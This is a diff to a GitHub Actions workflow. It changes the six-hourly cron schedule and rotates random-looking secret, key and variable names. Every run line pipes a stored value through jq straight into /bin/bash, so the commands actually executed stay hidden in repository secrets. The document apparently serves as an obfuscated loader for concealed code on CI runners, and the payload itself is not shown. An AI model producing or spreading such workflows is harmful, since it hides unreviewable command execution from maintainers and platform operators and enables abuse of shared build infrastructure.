@@ -1,25 +1,23 @@
 name: weimenghema
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
-jobs:  # 30782
+    - cron: '23 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: weimenghema
         env:
-          ujdp3: ${{ secrets.ujdp3 }}
+          ugx017: ${{ secrets.ugx017 }}
         run: |
-          echo $ujdp3 | jq -r .vpva28581 | /bin/bash
-          echo $oxxfd9 | jq -r .eurc0368 | /bin/bash
-          echo $w48315 | jq -r .x476 | /bin/bash
-          echo $luck9 | jq -r .ookyu32 | /bin/bash
-          echo $pbder660 | jq -r .dmpwi454 | /bin/bash
-          echo $tsab29907 | jq -r .k23638 | /bin/bash
-          echo $mfytd7 | jq -r .mrox7 | /bin/bash
-          echo $altw999 | jq -r .i6186 | /bin/bash
+          echo $ugx017 | jq -r .ivly87 | /bin/bash
+          echo $jo728 | jq -r .esbi36454 | /bin/bash
+          echo $xbfc46727 | jq -r .d65 | /bin/bash
+          echo $hh66 | jq -r .oatzu051 | /bin/bash
+          echo $k6310 | jq -r .s0 | /bin/bash
+          echo $symij77396 | jq -r .micwf51584 | /bin/bash
+          echo $eo406 | jq -r .rtrh59 | /bin/bash
+          echo $virua67 | jq -r .tc702 | /bin/bash
 
